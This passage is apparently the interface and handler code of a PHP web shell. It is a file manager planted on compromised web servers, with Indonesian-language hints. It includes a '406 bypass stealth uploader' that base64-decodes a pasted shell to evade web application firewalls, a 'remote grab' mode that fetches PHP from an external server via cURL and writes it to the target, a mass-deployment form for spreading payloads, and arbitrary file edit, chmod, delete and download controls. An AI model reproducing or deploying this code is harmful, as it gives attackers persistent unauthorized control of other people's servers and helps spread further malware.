                <form method="post">
                    <input type="hidden" name="f_path" value="<?= htmlspecialchars($edit_file) ?>">
                    <textarea id="code_editor" name="f_cnt"><?= $f_content ?></textarea>
                    <div style="margin-top:10px; display:flex; gap:10px;">
                        <button type="submit" name="save_f" class="btn-editor-save" style="flex:1;">SAVE PAYLOAD</button>
                        <a href="?d=<?= urlencode($dir) ?>" class="btn-editor-cancel" style="flex:1;">CANCEL</a>
                    </div>
                </form>
            </div>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/xml/xml.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/javascript/javascript.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/css/css.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/clike/clike.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/php/php.min.js"></script>
            <script>
                var editor = CodeMirror.fromTextArea(document.getElementById("code_editor"), {
                    lineNumbers: true, matchBrackets: true, mode: "application/x-httpd-php", theme: "dracula", lineWrapping: true
                });
                editor.setSize("100%", "500px");
            </script>
            <?php 
        } else { echo '<div class="alert" style="border-color:var(--red); color:var(--red);">ERROR: FILE NOT READABLE OR NOT ACCESSIBLE</div>'; }
    } elseif (@$_GET['mode'] == 'mass'){ ?>
        <div style="border:1px solid var(--magenta); background:rgba(0,0,0,0.4); padding:20px; border-radius:4px;">
            <h3 style="color:var(--magenta); margin-top:0; text-shadow:0 0 8px var(--magenta);">[ MASS DEPLOYMENT MODE ]</h3>
            <form method="post">
                <input type="text" name="target_root" value="<?= $dir ?>" placeholder="Target Path..." style="margin-bottom:10px; border-color:var(--magenta);">
                <input type="text" name="mass_name" placeholder="file_name.php" style="margin-bottom:10px; border-color:var(--magenta);">
                <textarea name="mass_content" placeholder="Payload content here..." style="height:150px; margin-bottom:10px; border-color:var(--magenta);"></textarea>
                <button type="submit" name="mass_deploy" style="width:100%; border:1px solid var(--magenta); color:var(--magenta); background:transparent; padding:12px; font-weight:700; cursor:pointer; border-radius:3px; transition:all 0.3s;">LAUNCH MASS UPLOAD</button>
            </form>
        </div>
    <?php } elseif (@$_GET['mode'] == 'bypass406') {
        $b406_msg = "";
        if (isset($_POST['do_bypass_b64'])) {
            if (@file_put_contents($dir . '/' . $_POST['b_name'], base64_decode($_POST['b_data']))) {
                $b406_msg = "SUCCESS: 406 BYPASSED & FILE WRITTEN [" . htmlspecialchars($_POST['b_name']) . "]";
            } else { $b406_msg = "FAILED: PERMISSION DENIED OR WAF BLOCKED"; }
        }
        if (isset($_POST['do_bypass_url'])) {
            $destiny = $_POST['b_url']; $fname = $_POST['b_name'];
            $grabbed = false;
            if (function_exists('curl_init')) {
                $ch = curl_init($destiny); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); $grabbed = curl_exec($ch); curl_close($ch);
            } elseif (function_exists('file_get_contents')) { $grabbed = @file_get_contents($destiny); }
            if ($grabbed !== false && @file_put_contents($dir . '/' . $fname, $grabbed)) {
                $b406_msg = "SUCCESS: REMOTE PAYLOAD GRABBED & WRITTEN [" . htmlspecialchars($fname) . "]";
            } else { $b406_msg = "FAILED: COULD NOT FETCH URL OR WRITE FILE"; }
        }
    ?>
        <div class="cyber-tools-interface" style="border-color:var(--gold);">
            <h3 style="color:var(--gold); margin-top:0; text-align:center; text-shadow:0 0 10px var(--gold); letter-spacing:3px;">[ 406 BYPASS STEALTH UPLOADER ]</h3>
            <?php if($b406_msg) echo "<div class='alert' style='border-color:var(--gold); color:var(--gold);'>$b406_msg</div>"; ?>
            <div style="display:flex; flex-wrap:wrap; gap:20px; margin-top:20px;">
                <div style="flex:1; min-width:280px; border:1px dashed var(--cyan); padding:15px; background:rgba(0,0,0,0.4); border-radius:4px;">
                    <h4 style="color:var(--cyan); margin-top:0;">METHOD 1: BASE64 DECODE</h4>
                    <p style="color:var(--steel); font-size:11px; margin-bottom:15px;">Encode shell lu ke Base64, paste di sini buat bypass WAF.</p>
                    <form method="post">
                        <input type="text" name="b_name" placeholder="filename.php" required style="margin-bottom:10px; border-color:var(--cyan);">
                        <textarea name="b_data" placeholder="Paste Base64 payload here..." required style="height:120px; margin-bottom:10px; border-color:var(--cyan);"></textarea>
                        <button type="submit" name="do_bypass_b64" style="width:100%; border:1px solid var(--cyan); color:var(--cyan); background:transparent; padding:10px; font-weight:700; cursor:pointer; border-radius:3px; transition:all 0.3s;">DECODE & INJECT</button>
                    </form>
                </div>
                <div style="flex:1; min-width:280px; border:1px dashed var(--magenta); padding:15px; background:rgba(0,0,0,0.4); border-radius:4px;">
                    <h4 style="color:var(--magenta); margin-top:0;">METHOD 2: REMOTE GRAB (cURL/FGC)</h4>
                    <p style="color:var(--steel); font-size:11px; margin-bottom:15px;">Tarik raw PHP dari server external langsung ke target.</p>
                    <form method="post">
                        <input type="text" name="b_name" placeholder="elvsec.php" required style="margin-bottom:10px; border-color:var(--magenta);">
                        <input type="text" name="b_url" placeholder="https://your-server.com/shell.txt" required style="margin-bottom:10px; border-color:var(--magenta);">
                        <button type="submit" name="do_bypass_url" class="btn-cyan-glow" style="width:100%; padding:10px;">FETCH & INJECT</button>
                    </form>
                </div>
            </div>
        </div>
    <?php } elseif(!@$_GET['mode'] || @$_GET['mode'] == '') { ?>
        
        <?php if(isset($_SESSION['copy_file'])): ?>
            <div style="margin-bottom:15px; text-align:right;">
                <form method="post">
                    <button type="submit" name="paste_f" class="btn-cyan-glow" style="padding:10px 15px; font-size:12px;">
                        <i class="fa-solid fa-paste"></i> PASTE: <?= htmlspecialchars(basename($_SESSION['copy_file'])) ?>
                    </button>
                </form>
            </div>
        <?php endif; ?>

        <div class="tools">
            <div class="neon-cyan-box">
                <form method="post" enctype="multipart/form-data" style="display:flex; flex-direction:column; height:100%; justify-content:space-between;">
                    <input type="file" name="u_f" style="margin-bottom:8px;">
                    <button type="submit" class="btn-cyan-glow" style="width:100%; padding:10px;">DEPLOY</button>
                </form>
            </div>
            <div class="neon-cyan-box">
                <form method="post" style="display:flex; flex-direction:column; height:100%; justify-content:space-between;">
                    <input type="text" name="f_n" placeholder="New file..." style="margin-bottom:8px;">
                    <button type="submit" name="mk_f" class="btn-cyan-glow" style="width:100%; padding:10px;">MK FILE</button>
                </form>
            </div>
            <div class="neon-cyan-box">
                <form method="post" style="display:flex; flex-direction:column; height:100%; justify-content:space-between;">
                    <input type="text" name="d_n" placeholder="New dir..." style="margin-bottom:8px;">
                    <button type="submit" name="mk_d" class="btn-cyan-glow" style="width:100%; padding:10px;">MK DIR</button>
                </form>
            </div>
        </div>
        
        <div class="table-responsive">
            <table>
                <thead>
                    <tr>
                        <th>IDENTIFIER</th>
                        <th class="col-size">SIZE</th>
                        <th class="col-chmod">CHMOD</th>
                        <th class="col-act">ACT</th>
                    </tr>
                </thead>
                <tbody>
    <?php
    $files = scandir($dir);
    foreach ($files as $file) {
        $p = $dir . DIRECTORY_SEPARATOR . $file;
        $isD = is_dir($p);
        $w = is_writable($p);
        $i = $file;
    ?>
    <tr>
        <td>
            <span class="dir-label" data-type="<?= $isD ? 'dir' : 'file' ?>"><?= $isD ? '[D]' : '[F]' ?></span>
            <a href="<?= $isD ? '?d='.urlencode($p) : '?edit='.urlencode($p).'&d='.urlencode($dir) ?>" class="item-t" data-writable="<?= $w ? '1' : '0' ?>"><?= $i ?></a>
        </td>
        <td class="col-size"><?= $isD ? '--' : formatSize(@filesize($p)) ?></td>
        <td class="col-chmod">
            <?php if($i !== '..'): ?>
            <form method="post" style="display:inline-flex; align-items:center; gap:5px;">
                <input type="hidden" name="c_path" value="<?= $p ?>">
                <input type="text" name="c_perm" value="<?= substr(sprintf('%o', @fileperms($p)), -4) ?>" class="<?= $w ? 'chmod-writable' : 'chmod-nonwritable' ?>" style="width:45px;">
                <button type="submit" name="ch_mod" class="btn-gray" style="padding:4px 8px; font-size:11px;">OK</button>
            </form>
            <?php else: ?>
            <span style="color:var(--text-dim);">-</span>
            <?php endif; ?>
        </td>
                         <td class="col-chmod">
                    <?php if($i !== '..'): ?>
                    <form method="post" style="display:inline-flex; align-items:center; gap:5px;">
                        <input type="hidden" name="c_path" value="<?= $p ?>">
                        <input type="text" name="c_perm" value="<?= substr(sprintf('%o', @fileperms($p)), -4) ?>" class="<?= $w ? 'chmod-writable' : 'chmod-nonwritable' ?>" style="width:45px;">
                        <button type="submit" name="ch_mod" class="btn-gray" style="padding:4px 8px; font-size:11px;">OK</button>
                    </form>
                    <?php else: ?>
                    <span style="color:var(--text-dim);">-</span>
                    <?php endif; ?>
                </td>
                <td class="col-act" style="text-align:right; white-space:nowrap;">
                    <?php if($i !== '..'): ?>
                        <form method="post" style="display:inline-block; margin-right:5px;">
                            <input type="hidden" name="old" value="<?= $p ?>">
                            <input type="text" name="new" placeholder="Ren" style="width:45px; font-size:12px; padding:4px; display:inline-block;">
                            <button type="submit" name="rename" class="btn-gray" style="padding:4px 8px; font-size:11px;">OK</button>
                        </form>
                        <form method="post" style="display:inline-block; margin-right:5px;">
                            <input type="hidden" name="c_path" value="<?= $p ?>">
                            <button type="submit" name="copy_f" class="btn-act-small act-cp" title="COPY"><i class="fa-regular fa-copy"></i></button>
                        </form>
                        <form method="post" style="display:inline-block;">
                            <input type="hidden" name="c_path" value="<?= $p ?>">
                            <button type="submit" name="unzip_f" class="btn-act-small act-unzip" title="UNZIP"><i class="fa-solid fa-file-zipper"></i></button>
                        </form>
                        <?php if(!$isD): ?>
                            <a href="?d=<?= urlencode($dir) ?>&download=<?= urlencode($p) ?>" class="btn-act-small act-dl" title="DOWNLOAD"><i class="fa-solid fa-download"></i></a>
                            <a href="?d=<?= urlencode($dir) ?>&del=<?= urlencode($p) ?>" class="btn-act-small act-del" title="WIPE" onclick="return confirm('WIPE TACTICAL TARGET?')"><i class="fa-solid fa-skull"></i></a>
                        <?php else: ?>
                            <span style="color:var(--text-dim); font-size:11px;">[ NO ACTION ]</span>
                        <?php endif; ?>
                    <?php endif; ?>
                </td>
            </tr>
            <?php } ?> </tbody>
                    </table>
                </div>
        <?php } ?> <div class="glow-static">
                <?php
                    $secret = "ZW1hbm9OcnhIQCAha2lzaXJlQiBrYUcgYXluYXNhaUIgb2dhSiByZW5lQiBnbmFZIQ==";
                    echo strrev(base64_decode($secret)); 
                ?>
            </div>
        <script>
            <?= $bg_terminal_js ?>
        </script>
        </body>
</html>